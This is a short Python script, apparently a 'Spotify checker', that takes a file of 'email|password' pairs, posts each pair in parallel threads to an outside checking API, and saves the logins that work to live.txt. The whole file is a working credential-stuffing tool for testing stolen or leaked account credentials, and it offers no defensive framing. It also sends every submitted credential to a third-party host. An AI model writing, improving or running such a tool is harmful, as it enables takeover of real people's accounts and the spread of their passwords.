#!usr/bin/python3.7
#Author : KANG-NEWBIE

from multiprocessing.pool import ThreadPool
import requests, os
#color
g='\033[1;32m'
r='\033[1;31m'
nc='\033[0m' #No color

tol=[]
til=0
pul=[]
pek=[]

def crack(email):
	global tol,til,pek
	til+=1
	req=requests.post("https://api.dw1.co/spotify/v2/check",data={"email":email,"password":tol[til-1]})
	if "true" in req.text:
		pek.append(email)
		open("live.txt","a+").write("%s|%s\n"%(email,tol[til-1]))
		print("[%sLIVE%s] %s -> %s"%(g,nc,email,tol[til-1]))
	else: print("[%sDIE%s] %s -> %s"%(r,nc,email,tol[til-1]))
os.system('clear')
print("""	  C H E C K E R
   ___|    _ \    _ \ __ __| _) 
 \___ \   |   |  |   |   |    | 
       |  ___/   |   |   |    | Author : KANG-NEWBIE
 _____/  _|     \___/   _|   _| Contact: t.me/kang_nuubi
                                
                                """)
try:
	print("[#] file harus berisi 'email|password'")
	o=open(input("%s[!] file list: "%(nc))).read().splitlines()
except Exception as f:
	exit("[file not found] %s"%(f))
for x in o:
	k=x.split("|")
	tol.append(k[1])
	pul.append(k[0])
p=ThreadPool(10)
p.map(crack,pul)
print("-"*30)
print("[!] Live: %s"%(len(pek)))
print("[!] Result saved: live.txt")
print("-"*30)
